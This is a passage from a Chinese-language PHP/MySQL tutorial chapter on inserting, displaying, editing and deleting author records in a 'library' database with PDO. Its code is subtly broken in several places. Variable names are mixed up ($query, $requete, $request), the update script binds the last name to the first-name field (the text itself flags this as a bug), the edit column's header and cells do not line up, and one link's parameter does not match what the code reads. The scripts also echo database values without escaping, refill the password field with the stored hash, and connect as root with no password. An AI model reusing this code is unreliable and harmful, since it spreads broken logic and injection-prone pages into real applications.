  \ {\n width: calc(100% - 20px);\n padding: 10px;\n border: 1px solid #ccc;\n border-radius:\
  \ 4px;\n margin-bottom: 15px;\n}\ntextarea {\n width: calc(100% - 20px);\n padding:\
  \ 10px;\n border: 1px solid #ccc;\n border-radius: 4px;\n margin-bottom: 15px;\n\
  }\ninput[type=\"submit\"] {\n background-color: #007bff;\n color: #fff;\n border:\
  \ none;\n padding: 10px 20px;\n cursor: pointer;\n border-radius: 4px;\n display:\
  \ block;\n margin: 0 auto;\n}\ninput[type=\"submit\"]:hover {\n background-color:\
  \ #0056b3;\n}\n```\n\n表单的 `action` 属性指向一个名为 `author_registration.php` 的文件路径，该文件负责检索表单提交的数据并将其插入\
  \ `library` 数据库的 `authors` 表中。让我们在 `library` 项目的根目录下创建此文件。\n\n运行 `index.php` 将显示以下表单：\n\
  \n![Image](img/image-150.png)\n\n##### 数据处理与插入\n\n###### author_registration.php\n\
  \n```\n<?php\n // Retrieve form data\n $lastname = $_POST['lastname'];\n $firstname\
  \ = $_POST['firstname'];\n $email = $_POST['email'];\n $password = $_POST['password'];\n\
  \ $biography = $_POST['biography'];\n // Database connection\n$connection = new\
  \ PDO(\"mysql:host=localhost;dbname=library\", \"root\",\"\");\n $connection->setAttribute(PDO::ATTR_ERRMODE,\
  \ PDO::ERRMODE_EXCEPTION);\n // Prepare insertion request\n $request = $connection->prepare(\"\
  INSERT INTO authors (last_name, first_name, email, password, biography) VALUES (:lastname,\
  \ :firstname, :email, :password, :biography)\");\n // Bind values to query parameters\n\
  \ $request->bindParam(':lastname', $lastname);\n $request->bindParam(':firstname',\
  \ $firstname);\n $request->bindParam(':email', $email);\n $request->bindParam(':password',\
  \ $password);\n $request->bindParam(':biography', $biography);\n // Execute query\n\
  \ $result = $request->execute();\n // Verify successful insertion\n if ($result)\
  \ {\n echo \"Author is registered successfully!\";\n } else {\n echo \"Error registered\
  \ author.\";\n }\n?>\n```\n\n此 PHP 代码首先通过 `POST` 方法检索从前一个 HTML 表单传输的数据。接下来，使用提供的凭据（主机名、数据库名、用户名和密码）通过\
  \ `PDO` 对象建立与 MySQL 数据库的连接。\n\n接下来，使用 `INSERT INTO` 语句准备一个插入 SQL 查询，以向 `authors`\
  \ 表添加新行。`lastname`、`firstname`、`email` 和 `password` 字段的值使用 `bindParam()` 方法绑定到查询参数。\n\
  \n值绑定到参数后，使用 `execute()` 方法执行查询，并将执行结果存储在 `$result` 变量中。\n\n最后，代码通过验证 `$result`\
  \ 的值来检查插入是否成功。如果为真，则显示一条消息，指示作者已成功注册。否则，显示一条错误消息，指示注册作者时出现问题。\n\n详细解释：\n\n\n\n\n\
  ### PHP 数据库操作：插入与查询作者信息\n\n#### 插入作者数据\n\n```php\n$query = $connection->prepare(\"\
  INSERT INTO authors (last_name, first_name, email, password, biography) VALUES (:lastname,\
  \ :firstname, :email, :password, :biography)\");\n```\n\n这行代码准备一条稍后在数据库中执行的插入 SQL\
  \ 查询。详细解释如下：\n\n*   **`$connection->prepare()`**：这是 PDO 对象的方法，用于准备供执行的 SQL 查询。它返回一个代表准备好查询的\
  \ `PDOStatement` 对象。\n*   **`\"INSERT INTO authors (last_name, first_name, email,\
  \ password, biography) VALUES (:lastname, :firstname, :email, :password, :biography)\"\
  `**：这是准备好的插入 SQL 查询。它指示数据库在 \"authors\" 表中插入新行，为 \"last_name\"、\"first_name\"、\"\
  email\"、\"password\" 和 \"biography\" 列提供值。列值由命名参数标记（`:lastname`、`:firstname`、`:email`、`:password`、`:biography`）表示，这些标记将在查询运行时链接到提供的值。\n\
  \n查询结构如下：\n\n*   `INSERT INTO authors`：表示向 \"authors\" 表发起插入请求。\n*   `(last_name,\
  \ first_name, email, password, biography)`：指定将添加值的列名。\n*   `VALUES (:lastname, :firstname,\
  \ :email, :password, :biography)`：表示要插入对应列的值。使用名为 `:lastname`、`:firstname`、`:email`、`:password`\
  \ 和 `:biography` 的命名参数标记来代表这些值。\n\n通过使用命名参数标记，准备好的查询可防止 SQL 注入攻击，并允许将 SQL 逻辑与要插入的数据值逻辑分离。\n\
  \n简而言之，这行代码准备了一条带有命名参数的插入查询，用于向 \"authors\" 表指定列中插入值。\n\n##### 绑定参数\n\n以下五行使用 `bindParam()`\
  \ 方法的代码，将准备查询中命名参数标记的值绑定到指定的 PHP 变量：\n\n```php\n$query->bindParam(':lastname', $lastname);\n\
  $requete->bindParam(':firstname', $firstname);\n$request->bindParam(':email', $email);\n\
  $request->bindParam(':password', $password);\n$requete->bindParam(':biography',\
  \ $biography);\n```\n\n*   `$query->bindParam(':lastname', $lastname)`：将 PHP 变量\
  \ `$lastname` 的值绑定到准备查询中名为 `:lastname` 的参数标记。\n*   `$requete->bindParam(':firstname',\
  \ $firstname)`：同理，将 `$firstname` 绑定到 `:firstname`。\n*   `$request->bindParam(':email',\
  \ $email)`：将 `$email` 绑定到 `:email`。\n*   `$request->bindParam(':password', $password)`：将\
  \ `$password` 绑定到 `:password`。\n*   `$requete->bindParam(':biography', $biography)`：将\
  \ `$biography` 绑定到 `:biography`。\n\n通过将 PHP 变量值链接到命名参数标记，这些行代码准备使用 \"authors\" 表每列的指定值来执行查询。这使得用户提供的数据能以安全受控的方式插入数据库。\n\
  \n##### 执行查询\n\n代码行：`$result = $request->execute();` 执行先前使用 PDO 对象的 `prepare()`\
  \ 方法准备好的查询。\n\n*   **`$result = $requete->execute();`**：此指令在代表准备查询的 `PDOStatement`\
  \ 对象 `$request` 上调用 `execute()` 方法。该方法使用绑定到参数标记的值（如前通过 `bindParam()` 定义）执行准备好的 SQL\
  \ 查询。若查询成功执行则返回 `true`，否则返回 `false`。返回值赋给变量 `$result`，可用于检查查询是否成功。\n\n此时，在你的 `index.php`\
  \ 页面提交并验证表单且未产生任何错误后，你将收到 \"Author is registered successfully!\" 消息。随后访问 `http://localhost/phpmyadmin/`\
  \ 并查看 \"library\" 数据库中的 \"authors\" 表，应能看到作者 \"Dupont Alice\" 的记录，其标识符为 1。\n\n![Image](img/image-151.png)\n\
  \n> **注意**：密码以未加密形式存储在数据库中，存在潜在安全风险。若恶意人员访问数据库，将获取此敏感信息，危及应用用户安全。密码应始终安全存储，例如使用哈希技术使其即使在数据库被未授权访问时也不可读。解决此问题的常见方案之一是在插入数据库前对密码进行哈希处理。\n\
  \n##### 密码哈希处理\n\n修改文件 `author_registration.php`，在数据库连接代码前添加以下行：\n\n```php\n// Password\
  \ hash\n$password_hash = password_hash($password, PASSWORD_DEFAULT);\n```\n\n此行代码使用\
  \ **`password_hash()`** 函数对从表单获取的密码进行哈希。该函数接受两个参数：要哈希的密码和使用的哈希算法。\n\n*   `$password`：包含从表单获取的原始密码的变量。\n\
  *   `$password_hash`：将包含密码哈希结果的变量。该结果是由哈希算法生成的安全唯一字符串。\n*   `PASSWORD_DEFAULT`：PHP\
  \ 提供的常量，代表 `password_hash()` 函数推荐的默认哈希算法。此常量可随 PHP 版本更新以使用最安全的可用哈希算法。\n\n接着，将行 `$request->bindParam(':password',\
  \ $password);` 替换为以下代码：\n\n```php\n// Use hashed password\n$request->bindParam(':password',\
  \ $password_hash);\n```\n\n若你在 `index.php` 页面填写表单注册新作者且一切顺利，将看到 \"Author added successfully!\"\
  \ 消息。检查数据库中的 authors 表，应观察到如下所示的注册数据：\n\n![Image](img/image-152.png)\n\n特别注意 ID\
  \ = 2 的作者的 password 列。该值为一长串字符串，表明密码在存储前已哈希处理，从而增强了数据安全性。你可以继续注册其他作者。\n\n#### 选择并显示数据库数据\n\
  \n本节介绍如何使用 PHP 和 MySQL 从数据库选择并显示数据。我们将首先编写代码选择数据库中 \"authors\" 表的所有作者，然后了解如何在 HTML\
  \ 表格中显示这些数据。\n\n在 \"library\" 项目目录中创建名为 `display_authors.php` 的新文件。以下是选择作者的代码：\n\
  \n```php\n<?php\n\n// Database connection\n$connection = new PDO(\"mysql:host=localhost;dbname=library\"\
  , \"root\", \"\");\n$connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\
  \n// Prepare author selection query\n$query = $connection->prepare(\"SELECT * FROM\
  \ authors\");\n\n// Execute query\n$query->execute();\n\n// Retrieve results as\
  \ associative array\n$authors = $query->fetchAll(PDO::FETCH_ASSOC);\n\n?>\n```\n\
  \n*   `$query = $connection->prepare(\"SELECT * FROM authors\");`：准备一条 SQL 查询，选择\
  \ \"authors\" 表中的所有列（`*`）。\n*   `$authors = $query->fetchAll(PDO::FETCH_ASSOC);`：以关联数组形式检索所有查询结果，并存储在变量\
  \ `$authors` 中。\n\n\n\n\n\n#### 摘要\n\n在第一步中，连接到数据库后，代码执行一条 SQL 查询以选择所有作者，检索结果，并将它们存储在关联数组\
  \ `$authors` 中。\n\n现在我们可以继续在 HTML 表格中显示这些作者了。\n\n请按如下方式修改文件 `display_authors.php`：\n\
  \n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\"\
  >\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\
  >\n    <title>作者列表</title>\n</head>\n<body>\n    <h2>作者列表</h2>\n    <?php\n    //\
  \ 第 1 部分 - 选择并检索所有作者\n    $connection = new PDO(\"mysql:host=localhost;dbname=library\"\
  , \"root\", \"\");\n    $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\
  \    $query = $connection->prepare(\"SELECT * FROM authors\");\n    $query->execute();\n\
  \    $authors = $query->fetchAll(PDO::FETCH_ASSOC);\n\n    // 第 2 部分 - 在 HTML 表格中显示结果\n\
  \    if (count($authors) > 0) {\n        echo \"<table>\";\n        echo \"<tr>\n\
  \            <th>ID</th>\n            <th>姓氏</th>\n            <th>名字</th>\n   \
  \         <th>邮箱</th>\n            <th>传记</th>\n        </tr>\";\n        foreach\
  \ ($authors as $author) {\n            echo \"<tr>\";\n            echo \"<td>{$author['author_id']}</td>\"\
  ;\n            echo \"<td>{$author['last_name']}</td>\";\n            echo \"<td>{$author['first_name']}</td>\"\
  ;\n            echo \"<td>{$author['email']}</td>\";\n            echo \"<td>{$author['biography']}</td>\"\
  ;\n            echo \"</tr>\";\n        }\n        echo \"</table>\";\n    } else\
  \ {\n        echo \"未找到作者。\";\n    }\n    ?>\n</body>\n</html>\n```\n\n这段代码的第 2\
  \ 部分首先通过检查从 `$authors` 变量检索到的作者数量是否大于零（即 `if (count($authors) > 0)` 条件）来判断数据库中是否有作者。如果找到作者，代码将生成一个\
  \ HTML 表格来显示每位作者的详细信息。否则，如果未找到作者，则显示消息“未找到作者。”\n\n在 `foreach` 循环中，会遍历 `$authors`\
  \ 数组中的每位作者。对于每位作者，代码生成一个新的表格行，包含作者 ID（`$author['author_id']`）、姓氏（`$author['last_name']`）、名字（`$author['first_name']`）、邮箱（`$author['email']`）和传记（`$author['biography']`）等详细信息。这些详细信息显示在表格单元格（`<td>`）中，每位作者占据一个新的表格行（`<tr>`）。\n\
  \n运行 `display_authors.php` 将产生类似以下的结果：\n\n![Image](img/image-153.png)\n\n为了美化该表格的外观，可以考虑应用\
  \ CSS 样式。首先创建一个 `style_tab.css` 文件，步骤与上一章类似。接下来，在 `display_authors.php` 文件的头部（`head`）中引用该文件，添加以下代码行：\n\
  \n```html\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"\
  width=device-width, initial-scale=1.0\">\n    <title>作者列表</title>\n    <link rel=\"\
  stylesheet\" href=\"style_tab.css\">\n</head>\n```\n\n然后，您可以添加以下 CSS 样式来自定义表格的外观：\n\
  \n```css\ntable {\n    width: 100%;\n    border-collapse: collapse;\n}\n\nth, td\
  \ {\n    border: 1px solid #ddd;\n    padding: 8px;\n    text-align: left;\n}\n\n\
  th {\n    background-color: #f2f2f2;\n}\n```\n\n在该代码中，我们包含：\n\n*   **Table（表格）**：此规则定义文档中所有表格的基本样式。\n\
  \    *   `width: 100%;` 表示表格的宽度应适应其容器的宽度。\n    *   `border-collapse: collapse;`\
  \ 指定表格单元格的边框应合并为单一边框。\n*   **th, td**：此规则定义表格中表头单元格（`th`）和数据单元格（`td`）的样式。\n    *\
  \   `border: 1px solid #ddd;` 在每个单元格周围创建 1 像素的浅灰色实线边框。\n    *   `padding: 8px;`\
  \ 为每个单元格添加 8 像素的内边距以提高可读性。\n    *   `text-align: left;` 将每个单元格中的文本内容左对齐。\n*   **th**：此规则定义表格中表头单元格（`th`）的特定样式。\n\
  \    *   `background-color: #f2f2f2;` 为表头单元格设置浅灰色背景色，以便在视觉上将其与数据单元格区分开来。\n\n现在，如果您运行文件\
  \ `display_authors.php`，将获得类似以下的结果：\n\n![Image](img/image-154.png)\n\n#### 结论\n\n\
  在本章中，我们探讨了使用 PHP 和 MySQL 插入、检索和显示数据库数据的过程。我们学习了如何建立到数据库的安全连接、将数据插入表中、使用 SQL 查询检索这些数据，最后在\
  \ Web 应用程序中以结构化方式显示这些数据。\n\n通过使用 PDO 的特性，我们能够安全高效地管理操作，防止潜在的攻击，如 SQL 注入。此外，我们还探讨了在将密码存储到数据库之前对其进行哈希处理以提高安全性的技术。\n\
  \n最后，通过应用 CSS 样式，我们能够在格式良好的表格中展示检索到的数据，提供最佳的用户体验。\n\n本章为理解 Web 应用程序中数据操作的基础知识提供了坚实的基础，为更高级的功能（如数据更新和删除）铺平了道路，我们将在下一章中介绍这些内容。\n\
  \n### 第 12 章：在数据库中更新和删除数据\n\n在数据库中更新和删除数据是维护存储信息的完整性和相关性的关键操作。在本章中，我们将详细探讨如何使用 PHP\
  \ 和 MySQL 执行这些操作。\n\n我们将介绍更新表中现有记录的技术，以及安全删除数据的方法。我们还将研究良好的安全实践，以避免错误并在执行这些关键操作时保护敏感数据。\n\
  \n通过将本章获得的知识与前几章关于数据插入、检索和显示的知识相结合，您将能够创建健壮、功能完善的应用程序，充分发挥关系型数据库的潜力。\n\n#### 在数据库中更新数据\n\
  \n在本节中，我们将探讨在数据库中更新数据。更新是修改表中现有值的过程。无论是为了纠正错误、更新信息还是监控数据演变，执行更新的能力在 Web 应用程序开发中至关重要。\n\
  \n我们将探讨使用 PHP 在 MySQL 数据库中更新数据所涉及的各个步骤。这包括准备更新请求、执行这些请求以及检查操作是否成功。\n\n为了演示更新操作，我们将继续开发我们的“图书馆”迷你项目。我们将为您提供详细说明，指导您如何安全高效地更新您自己的项目。\n\
  \n##### 更新流程\n\n通常，要更新表中的数据，您需要遵循以下步骤：\n\n1.  **识别要更新的记录**：您必须首先确定要更新的表记录。这可以通过检索该记录的标识符来完成，例如在我们的示例中是作者\
  \ ID。\n2.  **检索新数据**：获取您想要为此记录更新的新数据。\n3.  **数据库连接**：使用 PDO 建立数据库连接以运行 SQL 查询。\n\
  4.  **准备并执行更新请求**：使用 PDO 的 `prepare()` 方法准备更新 SQL 查询。使用 `execute()` 方法执行请求。\n5.\
  \  **绑定值**：使用 `bindParam()` 方法将替换值绑定到查询参数。\n6.  **检查更新是否成功**：检查查询执行的结果，以确认更新是否成功。\n\
  7.  **显示确认消息**：显示适当的消息，告知用户更新操作的结果。\n\n以下是一个 PHP 代码示例，您可以将其放在一个名为 `edit_author.php`\
  \ 的新文件中：\n\n```php\n<?php\n$author_id = 1; // 要更新的作者 ID 示例\n\n// 新作者信息\n$new_lastname\
  \ = \"New Last Name\";\n$new_firstname = \"New First Name\";\n$new_email = \"newaddress@example.com\"\
  ;\n```\n\n\n\n\n### 更新作者信息\n\n#### PHP 更新单个作者信息示例\n\n```php\n$new_password = \"\
  new_password\";\n$new_biography = \"New biography\";\n\n// Database connection\n\
  $connection = new PDO(\"mysql:host=localhost;dbname=library\", \"root\", \"\");\n\
  $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n// Update\
  \ request\n$request = $connection->prepare(\"UPDATE authors SET\n    last_name =\
  \ :new_lastname,\n    first_name = :new_firstname,\n    email = :new_email,\n  \
  \  password = :new_password,\n    biography = :new_biography\n    WHERE author_id\
  \ = :author_id\");\n\n// Bind parameters\n$request->bindParam(':new_lastname', $new_lastname);\n\
  $request->bindParam(':new_firstname', $new_firstname);\n$request->bindParam(':new_email',\
  \ $new_email);\n$request->bindParam(':new_password', $new_password);\n$request->bindParam(':new_biography',\
  \ $new_biography);\n$request->bindParam(':author_id', $author_id);\n\n// Execute\
  \ query\n$result = $request->execute();\n\n// Verify successful update\nif ($result)\
  \ {\n    echo \"Information updated successfully\";\n} else {\n    echo \"An error\
  \ occurred during the update\";\n}\n?>\n```\n\n这段 PHP 代码演示了在 `authors` 表中更新 `author_id\
  \ = 1` 的单个作者信息的过程。在此操作中，作者的新姓氏、名字、邮箱、密码和传记值预先定义。然后使用 PDO 建立数据库连接。使用 PDO 对象的 `prepare()`\
  \ 方法准备更新 SQL 查询，其中使用 `UPDATE ... SET` 语句指定要更新的列和新值。然后使用 `bindParam()` 方法将新作者信息的值和要更新的作者\
  \ ID 绑定到查询参数。最后，使用 PDO 对象的 `execute()` 方法执行更新请求。\n\n如果执行此代码，通常会收到以下消息：\n\n![Image](img/image-155.png)\n\
  \n当查询 `authors` 表中的数据时，将看到 ID 为 1 的作者信息已被修改：\n\n![Image](img/image-156.png)\n\n\
  您可能注意到在之前的代码中，作者 ID 和新数据是静态定义的。然而在实践中，动态检索它们至关重要。\n\n这可以通过多种方式实现：例如，设置一个表单让用户输入相关作者的标识符，然后检索它。另一种选择是在显示所有作者的表格的每一行前添加一个链接，从而传输相应的作者\
  \ ID。我们将在后续内容中开发这种方法。\n\n新数据可以通过表单管理。这将首先显示要更新的旧数据，然后允许用户输入新信息。\n\n#### 更新所有作者的公告板\n\
  \n在上一章中，我们开发了在表格中显示所有作者数据的过程。在本节中，我们将通过向表格的每一行添加链接来增强此过程。此链接将作者的标识符传递给名为 `form_edit_author.php`\
  \ 的脚本，该脚本将检索与此标识符对应的作者数据，并将这些数据显示在允许输入新信息的表单中。\n\n在文件 `display_authors.php` 中，我们进行两项主要更改：\n\
  \n1.  我们向显示表添加一个标题为 \"Edit\" 的列：`<th>Edit</th>`。\n2.  然后我们向每个表格单元格添加 \"Edit\" 链接：\n\
  \n```php\necho \"<td><a href='form_edit_author.php?id={$author['author_id']}'>Edit</a></td>\"\
  ;\n```\n\n以下是 `display_authors.php` 文件的修改版本：\n\n```html\n<!DOCTYPE html>\n<html\
  \ lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\"\
  \ content=\"width=device-width, initial-scale=1.0\">\n    <title>List of Authors</title>\n\
  \    <link rel=\"stylesheet\" href=\"style_tab.css\">\n</head>\n<body>\n    <h2>List\
  \ of Authors</h2>\n    <?php\n    // Part1 - select and retrieve all authors\n \
  \   $connection = new PDO(\"mysql:host=localhost;dbname=library\", \"root\", \"\"\
  );\n    $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\
  \    $query = $connection->prepare(\"SELECT * FROM authors\");\n    $query->execute();\n\
  \    $authors = $query->fetchAll(PDO::FETCH_ASSOC);\n\n    // Part 2 - Displaying\
  \ results in an HTML table\n    if (count($authors) > 0) {\n        echo \"<table>\"\
  ;\n        echo \"<tr>\n            <th>Edit</th>\n            <th>ID</th>\n   \
  \         <th>Last Name</th>\n            <th>First Name</th>\n            <th>Email</th>\n\
  \            <th>Biography</th>\n        </tr>\";\n        foreach ($authors as\
  \ $author) {\n            echo \"<tr>\";\n            echo \"<td>{$author['author_id']}</td>\"\
  ;\n            echo \"<td>{$author['last_name']}</td>\";\n            echo \"<td>{$author['first_name']}</td>\"\
  ;\n            echo \"<td>{$author['email']}</td>\";\n            echo \"<td>{$author['biography']}</td>\"\
  ;\n            echo \"<td><a href='form_edit_author.php?author_id={$author['author_id']}'>Edit</a></td>\"\
  ;\n            echo \"</tr>\";\n        }\n        echo \"</table>\";\n    } else\
  \ {\n        echo \"No author found.\";\n    }\n    ?>\n</body>\n</html>\n```\n\n\
  这些修改向作者显示表添加了一个 \"Edit\" 列，其中每一行包含一个指向名为 `form_edit_author.php` 的脚本的 \"Edit\" 链接，并将相应的作者\
  \ ID 作为参数传递。\n\n执行此代码产生的结果类似于以下内容：\n\n![Image](img/image-157.png)\n\n然后创建一个名为 `form_edit_author.php`\
  \ 的新空脚本。\n\n当您点击 \"Edit\" 链接时，将被重定向到此文件 `form_edit_author.php`，并通过 URL 传输相应的作者 ID。\n\
  \n![Image](img/image-158.png)\n\n#### 在表单中检索和显示数据\n\n在我们之前创建的 `form_edit_author.php`\
  \ 文件中，我们使用 `$_GET` 超全局变量从 URL 中检索要更新的作者 ID。然后，我们查询数据库以将相关作者的所有数据检索到一个关联数组中。\n\n\
  ##### 从数据库检索数据\n\n```php\n<?php\n// Retrieve the author ID to be updated\n$author_id\
  \ = $_GET['author_id'];\n\n// Connect to database\n$connection = new PDO(\"mysql:host=localhost;dbname=library\"\
  , \"root\", \"\");\n$connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\
  \n// Prepare selection query\n$query = $connection->prepare(\"SELECT * FROM authors\
  \ WHERE author_id = :author_id\");\n$query->bindParam(':author_id', $author_id);\n\
  \n// Execute request\n$query->execute();\n\n// Retrieve results\n$author = $query->fetch(PDO::FETCH_ASSOC);\n\
  ```\n\n这段 PHP 代码用于从数据库检索特定作者的信息并在修改表单中显示。以下是代码的详细解释：\n\n- **`$_GET['author_id']`**：此行检索\
  \ URL 中传输的作者标识符，可通过 `$_GET` 超全局变量访问。\n- **`fetch(PDO::FETCH_ASSOC)`** 方法用于以关联数组的形式检索查询结果的第一行。此数组包含从数据库检索的作者数据。\n\
  \n##### 将检索到的数据保存到变量中\n\n然后，如果存在与 URL 中传递的标识符对应的作者，将关联数组 `$author` 中存储的数据保存到变量中，以便于在表单中使用。\n\
  \n```php\n// Check if author exists\nif ($author) {\n    // Retrieve author information\n\
  \    $lastname = $author['last_name'];\n    $firstname = $author['first_name'];\n\
  \    $email = $author['email'];\n    $password = $author['password'];\n    $biography\
  \ = $author['biography'];\n}\n```\n\n此代码段用于提取从数据库检索的作者信息并将其存储在单独的变量中，以便稍后在修改表单中使用。例如：`$lastname\
  \ = $author['last_name'];` 这一行从关联数组 `$author` 中提取 \"last_name\" 列的值并将其存储在变量 `$lastname`\
  \ 中。这意味着变量 `$lastname` 现在包含从数据库检索的作者姓氏。\n\n##### 在表单中显示数据\n\n\n\n### 编辑作者信息\n\n\
  完成此操作后，我们会在一个类似于上一章注册新作者所用的表单中显示这些数据。\n\n```html\n<form action=\"modify_author.php\"\
  \ method=\"POST\">\n  <h2>Edit an Author</h2>\n  <label>Last Name:</label>\n  <input\
  \ type=\"text\" name=\"lastname\" value=\"<?= $lastname ?>\"><br>\n  <label>Firstname:</label>\n\
  \  <input type=\"text\" name=\"firstname\" value=\"<?= $firstname ?>\"><br>\n  <label>Email:</label>\n\
  \  <input type=\"email\" name=\"email\" value=\"<?= $email ?>\"><br>\n  <label>Password:</label>\n\
  \  <input type=\"password\" name=\"password\" value=\"<?= $password ?>\"><br>\n\
  \  <label>Biography:</label>\n  <textarea name=\"biography\"><?= $biography ?></textarea><br>\n\
  \  <input type=\"hidden\" name=\"author_id\" value=\"<?= $author_id ?>\">\n  <input\
  \ type=\"submit\" value=\"Edit\">\n</form>\n```\n\n这段 HTML 代码代表一个用于修改数据库中作者信息的表单。以下是详细说明：\n\
  \n`<form>` 标签的 `action` 属性指定了处理表单数据的 PHP 脚本的 URL。在本例中，它是 `modify_author.php`，使用的\
  \ HTTP 方法是 `POST`。\n\n在 `<form>` 标签内部，使用 `<h2>` 标题来表明该表单用于修改作者信息。\n\n接下来，一系列 `<input>`\
  \ 字段和一个 `<textarea>` 字段用于输入作者的新信息。每个字段都有一个 `name` 属性，对应表单提交时 `$_POST` 数组中的字段名。\n\
  \n当前字段值通过 PHP 定义，使用 `<?= ?>` 标签显示包含作者当前数据的 PHP 变量。例如：`value=\"<?= $lastname ?>`\
  \ 将变量 `$lastname` 的值设置在表单的 `lastname` 字段中。\n\n密码字段使用 `type=\"password\"`，出于安全原因会隐藏输入的字符。\n\
  \n一个类型为 `hidden` 的 `<input>` 字段用于存储作者 ID，但对用户不可见。这使得作者 ID 可以在无需用户输入的情况下传递给处理脚本。\n\
  \n最后，一个 `submit` 按钮用于提交表单并将数据发送给 PHP 脚本进行处理。\n\n该表单允许用户修改作者信息并提交以更新数据库。\n\n####\
  \ 完整脚本：`form_edit_author.php`\n\n以下是脚本 `form_edit_author.php` 的完整代码：\n\n```html\n\
  <!DOCTYPE html>\n<html lang=\"fr\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta\
  \ name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Edit\
  \ Author</title>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n\
  \  <?php\n  // Retrieve the author ID to be updated\n  $author_id = $_GET['author_id'];\n\
  \n  // Connect to database\n  $connection = new PDO(\"mysql:host=localhost;dbname=library\"\
  , \"root\", \"\");\n  $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\
  \n  // Prepare selection query\n  $query = $connection->prepare(\"SELECT * FROM\
  \ authors WHERE author_id = :author_id\");\n  $query->bindParam(':author_id', $author_id);\n\
  \n  // Execute request\n  $query->execute();\n\n  // Retrieve results\n  $author\
  \ = $query->fetch(PDO::FETCH_ASSOC);\n\n  // Check if author exists\n  if ($author)\
  \ {\n    // Retrieve author information\n    $lastname = $author['last_name'];\n\
  \    $firstname = $author['first_name'];\n    $email = $author['email'];\n    $password\
  \ = $author['password'];\n    $biography = $author['biography'];\n  }\n  ?>\n\n\
  \  <form action=\"modify_author.php\" method=\"POST\">\n    <h2>Edit an Author</h2>\n\
  \    <label>Last Name:</label>\n    <input type=\"text\" name=\"lastname\" value=\"\
  <?= $lastname ?>\"><br>\n    <label>Firstname:</label>\n    <input type=\"text\"\
  \ name=\"firstname\" value=\"<?= $firstname ?>\"><br>\n    <label>Email:</label>\n\
  \    <input type=\"email\" name=\"email\" value=\"<?= $email ?>\"><br>\n    <label>Password:</label>\n\
  \    <input type=\"password\" name=\"password\" value=\"<?= $password ?>\"><br>\n\
  \    <label>Biography:</label>\n    <textarea name=\"biography\"><?= $biography\
  \ ?></textarea><br>\n    <input type=\"hidden\" name=\"author_id\" value=\"<?= $author_id\
  \ ?>\">\n    <input type=\"submit\" value=\"Edit\">\n  </form>\n</body>\n</html>\n\
  ```\n\n此时，如果您在显示所有作者的表格中选择“编辑”列中的任意链接，将会被重定向到类似下图所示的页面：\n\n![Image](img/image-159.png)\n\
  \n除了展示检索到的数据外，该表单还提供了在提交前进行修改的可能性。表单验证后，会被定向到 `modify_author.php` 脚本，该脚本负责使用表单中输入的信息更新数据库中的数据。以下是更新后的\
  \ `modify_author.php` 脚本代码：\n\n```php\n<?php\n$author_id = $_POST['author_id'];\
  \ // Author ID to be updated\n\n// New author information\n$new_lastname = $_POST['lastname'];\n\
  $new_firstname = $_POST['firstname'];\n$new_email = $_POST['email'];\n$new_password\
  \ = $_POST['password'];\n$new_biography = $_POST['biography'];\n\n// Hash password\n\
  $password_hashed = password_hash($new_password, PASSWORD_DEFAULT);\n\n// Database\
  \ connection\n$connection = new PDO(\"mysql:host=localhost;dbname=library\", \"\
  root\", \"\");\n\n// Update request\n$request = $connection->prepare(\"UPDATE authors\
  \ SET last_name = :new_lastname, first_name = :new_firstname, email = :new_email,\
  \ password = :new_password, biography = :new_biography WHERE author_id = :author_id\"\
  );\n\n// Bind parameters\n$request->bindParam(':author_id', $author_id);\n$request->bindParam(':new_lastname',\
  \ $new_lastname);\n$request->bindParam(':new_firstname', $new_lastname); // Note:\
  \ Potential bug in source, binding $new_lastname instead of $new_firstname\n$request->bindParam(':new_email',\
  \ $new_email);\n$request->bindParam(':new_password', $password_hashed);\n$request->bindParam(':new_biography',\
  \ $new_biography);\n\n// Execute query\n$result = $request->execute();\n\n// Check\
  \ update success\nif ($result) {\n  echo \"Information updated successfully\";\n\
  } else {\n  echo \"An error occurred during the update.\";\n}\n?>\n```\n\n这段 PHP\
  \ 代码通过 `POST` 方法检索作者修改表单提交的数据。它使用 `$_POST` 超全局变量，首先获取要更新的作者 ID，以及名、姓、邮箱、密码和传记等新信息。\n\
  \n然后，出于安全原因，使用 `password_hash()` 函数对密码进行哈希处理。接着使用 `PDO` 建立数据库连接。\n\n准备一条更新查询，以更新\
  \ `authors` 表中的作者信息。查询参数绑定到从表单检索到的值。\n\n随后执行请求并检查结果。如果更新成功，则显示成功消息；否则，返回错误消息。\n\n\
  #### 从数据库删除数据\n\n在本节中，我们将探讨使用 PHP 和 MySQL 从数据库中删除数据的过程。删除数据是一项关键操作，需要特别小心，以避免任何无意的丢失或对现有数据的破坏。我们将探索在数据库表中删除记录的不同方法，重点关注良好的安全性和效率实践。您将学习如何安全地构建和执行删除查询，以及如何处理该过程中可能出现的任何错误。\n\
  \n我们将从探索最简单的方法开始，即使用 `SQL DELETE` 查询根据特定标准删除单条记录或记录集。我们还将讨论使用此方法时应采取的预防措施，以避免无意或未经授权的数据删除。\n\
  \n为了演示删除数据的过程，我们将继续开发我们的“图书馆”项目。我们将详细解释如何在您自己的项目中安全高效地执行此操作。\n\n\n\n### 数据管理：更新与删除操作\n\
  \n#### 显示作者列表并添加删除功能\n\n在 `display_authors.php` 页面中，该页面显示所有作者，我们将引入一个名为“Delete”的新列。该列中的每个单元格将包含一个链接，允许将相应的作者\
  \ ID 传递给新的 `delete_author.php` 文件。该文件将负责处理所选作者的删除操作。\n\n以下是更新后的 `display_authors.php`\
  \ 脚本代码：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"\
